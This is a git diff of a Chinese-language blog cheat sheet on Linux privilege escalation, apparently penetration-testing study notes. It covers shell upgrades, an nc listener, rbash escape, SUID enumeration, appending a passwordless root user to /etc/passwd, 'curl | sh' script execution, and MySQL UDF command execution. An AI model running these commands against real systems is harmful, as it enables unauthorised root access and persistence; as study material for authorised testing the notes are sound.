@@ -6,16 +6,31 @@ tags = ["Linux", "提权"]
 description = "Linux常见提权方法"
 +++
 
+## 终端优化
+
 ### 终端升级
+
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 stty raw -echo
 export TERM=xterm-color
-
-rlwrap nc -lvnp 443 # 修复方向键
 ```
 
-### 手动枚举
+使用rlwrap修复方向键乱码问题
+
+```bash
+rlwrap nc -lvnp 443
+```
+
+### rbash逃逸
+
+```bash
+BASH_CMDS[a]=/bin/bash;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
+export PATH=$PATH:/bin/
+export PATH=$PATH:/usr/bin  # 修复环境变量
+```
+
+## 手动枚举
 ```bash
 # 用户枚举
 who     # 列出当前所有登录的用户的信息
@@ -57,6 +72,8 @@ cat /etc/fstab      # 查询未挂载磁盘
 curl <url> | sh     # 直接执行在线脚本
 ```
 
+## 便捷命令
+
 ### 建立一个简易服务器
 ```bash
 sudo python3 -m http.server port
@@ -87,11 +104,15 @@ nc -lvnp port | tee result.txt  # tee命令将数据分流，同时输出到标�
 less -r result.txt
 ```
 
+## SUID提权
+
 ### 查找所有具有SUID位的文件
+
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
+### 提权方法
 
 ### git 提权
 ```bash
@@ -121,9 +142,44 @@ tee可以向文件追加写入内容，向passwd中添加新的root用户，再�
 ```bash
 echo "test::0:0:: :/bin/bash" | sudo tee -a /etc/passwd
 ```
-### rbash逃逸
+
+## 服务漏洞提权
+
+### MySQL-UDF提权
+
+提权条件：
+
+1. 必须掌握一个具有创建/使用函数权限的MySQL账户
+2. secure_file_priv 权限必须为空('')，除非指定的目录恰好就是我们在提权过程中用到的目录(如plugin目录)。该权限用于限制Load data、select into outfile、load_file()操作
+
+提权原理：定义能够以高权限执行系统命令的函数，将该函数导入到数据库中，通过MySQL数据库执行系统命令以实现提权
+
+searchsploit搜索udf利用exploit
+
 ```bash
-BASH_CMDS[a]=/bin/bash;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
-export PATH=$PATH:/bin/
-export PATH=$PATH:/usr/bin  # 修复环境变量
+searchsploit mysql udf
+```
+
+在靶机中查看secure_file_priv权限状况
+
+```sql
+show variables like '%secure_file_priv%';
+```
+
+查询plugin目录位置，创建UDF函数时会写入这里
+
+```sql
+show variables like '%plugin%';
+```
+
+查询所有定义的函数
+
+```sql
+select * from mysql.func;
+```
+
+执行命系统令
+
+```sql
+select your_func('command');
 ```
